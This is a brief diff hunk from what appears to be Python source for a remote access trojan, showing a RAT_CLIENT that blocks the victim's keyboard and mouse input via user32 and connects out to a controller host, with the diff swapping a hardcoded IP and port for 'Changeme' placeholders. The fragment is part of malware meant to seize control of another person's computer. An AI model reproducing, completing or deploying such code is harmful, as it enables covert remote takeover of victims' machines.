@@ -545,6 +545,6 @@ shutdown - shutdown the system
         user32.BlockInput(True)
         user32.mouse_event(0x0001, 0, 0, 0, 0)
 
-client = RAT_CLIENT('192.168.137.1', 1234)
+client = RAT_CLIENT('Changeme', Changeme)
 client.build_connection()
 client.execute()
